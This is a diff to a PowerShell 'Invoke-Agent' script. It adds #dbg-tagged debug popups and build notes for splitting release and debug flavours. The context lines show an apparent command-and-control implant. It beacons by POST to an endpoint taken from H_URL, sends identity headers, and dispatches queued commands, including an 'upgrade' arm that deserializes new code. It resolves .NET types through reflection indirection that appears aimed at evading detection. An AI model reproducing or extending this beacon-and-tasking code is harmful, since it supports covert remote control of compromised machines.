@@ -17,6 +17,16 @@
 #   • A SOLO array inside @(...) unrolls to object[]; arrays in multi-element literals keep
 #     their type. Variable-stored references (PSObject-wrapped) are re-cast at the call site.
 # All constructs are .NET 2.0 / PS 2.0-safe per the host contract.
+#
+# DEBUG FLAVOR (the csharp-agent "#if DEBUG" analog — PowerShell has no preprocessor, so
+# the marker is a LINE TAG): any source line ending in a #dbg comment exists ONLY in the
+# debug build. build.ps1 splits the flavors — dist/ (release) drops every tagged line
+# outright (zero diagnostics remain, CI-gated), dist-debug/ keeps the code and drops the
+# tag suffix. CI publishes dist/ to the rolling 'preview' release and dist-debug/ to the
+# rolling 'debug' release: the tag is the flavor, the asset filename is shared. The debug
+# build pops a blocking topmost MessageBox per milestone (the csharp-agent Diag.Show
+# contract — operator-visible, one click per call, hand-debugging only). The CI smoke
+# test runs the RELEASE flavor: a debug popup would park the runner forever.
 function Invoke-Agent {
     # ── reflection helpers ──────────────────────────────────────────
     # mscorlib types via the String Type's assembly; System.dll types via a WebClient anchor
@@ -64,6 +74,17 @@ function Invoke-Agent {
         } catch {
         } finally { $script:inShip = $false }
     }
+    # DEBUG-ONLY diagnostics — the release flavor strips this whole block (comment lines #dbg
+    # included, tag suffix dropped in debug). The popup is the COM shell's MessageBox twin: #dbg
+    # blocking, topmost, info icon, caption = the step string behind the debug prefix, #dbg
+    # text = the detail — the csharp-agent Diag.Show contract. Milestones only: every #dbg
+    # call costs the operator one click. #dbg
+    function Dbg($step, $detail) { #dbg
+        try { #dbg
+            $sh = New-Object -ComObject 'WScript.Shell' #dbg
+            $null = $sh.Popup(('' + $detail), 0, ('ps-agent dbg ' + $step), 327744) #dbg
+        } catch {} #dbg
+    } #dbg
     # ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
     # The body is a stream of [u32le length][bytes] frames; one POST carries every response
     # owed since the last one, and the answer carries every queued command (same contract as
@@ -240,6 +261,7 @@ function Invoke-Agent {
     function DispatchCommand([byte[]]$frame) {
         $corrId = 0
         if ($frame.Length -ge 5) { $corrId = CallStatic (ResolveM 'System.BitConverter') 'ToUInt32' @([byte[]]$frame, 1) }
+        Dbg ('[cmd] 0x{0:x}' -f $frame[0]) ('corrId ' + $corrId) #dbg
         if ($frame[0] -eq 10) { $script:exiting = $true; return $null }
         if ($frame[0] -eq 11) {
             try {
@@ -317,6 +339,7 @@ function Invoke-Agent {
                 Log 'upgrade: deserialize done'
                 return ,(Reply 0)
             } catch {
+                Dbg '[0x0B] upgrade failed' $_.Exception.Message #dbg
                 Log ('upgrade failed: ' + $_.Exception.Message)
                 return ,(Reply 1)
             }
@@ -334,6 +357,10 @@ function Invoke-Agent {
     # ENTRY — a ship EVERY idle cycle doubled the idle request cost).
     $script:localSleepSec = 0
     $script:idleLogged = $false
+    # Debug flavor: first-beacon-cycle popups only (the csharp-agent "healthy idle
+    # iterations stay silent" rule — one [6]/[7] pair, never one per loop).
+    $script:firstPost = $true #dbg
+    Dbg '[1] start' ('pid ' + $PID) #dbg
     # Shared encoders, resolved once: UTF-8 for log frames, latin-1 in the upgrade arm.
     $utf8 = CallStatic (ResolveM 'System.Text.Encoding') 'GetEncoding' @(65001)
     # TLS 1.2 by int-cast (relays sit on modern TLS stacks; on .NET 3.5 the Tls12 enum
@@ -347,13 +374,20 @@ function Invoke-Agent {
             SetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol' (CallStatic (ResolveM 'System.Enum') 'ToObject' @($proto.GetType(), ([int]$proto -bor 3072)))
         }
         SetPropS (ResolveS 'System.Net.ServicePointManager') 'Expect100Continue' $false
+        Dbg '[3] tls' 'applied' #dbg
     } catch {}
     $script:beaconUrl = ReadEnv 'H_URL'
-    if (-not $script:beaconUrl) { Log 'beacon endpoint not set'; return 'fail' }
+    if (-not $script:beaconUrl) {
+        Dbg '[exit] H_URL not set' '' #dbg
+        Log 'beacon endpoint not set'; return 'fail'
+    }
+    Dbg '[2] H_URL' $script:beaconUrl #dbg
     $script:identityHeaders = BuildIdentity
     Log ('PowerShell agent beaconing to ' + $script:beaconUrl + ' as ' + $script:identityHeaders[1][1])
+    Dbg '[5] identity' ($script:identityHeaders[1][1] + ' (' + $script:identityHeaders.Count + ' headers)') #dbg
     $pending = @()
     while (-not $script:exiting) {
+        if ($script:firstPost) { Dbg '[6] POST #1' $script:beaconUrl } #dbg
         try {
             $req = NewPostRequest 45000
             if ($pending.Count -gt 0) { $body = BuildBody $pending } else { $body = New-Object 'byte[]' 0 }
@@ -363,8 +397,10 @@ function Invoke-Agent {
             $null = CallInst $rs 'Close' $null
             $resp = CallInst $req 'GetResponse' $null
         } catch {
+            Dbg '[exit] beacon POST threw' $_.Exception.Message #dbg
             return 'fail'
         }
+        if ($script:firstPost) { $script:firstPost = $false; Dbg '[7] POST #1 ok' '' } #dbg
         # Deep-idle hint (X-Sleep-Hint, seconds): how long to wait LOCALLY before the
         # next POST after an empty answer. Old relays omit it (→ 0 = immediate
         # re-POST); clamped so a bad header can never park the agent. Read BEFORE the
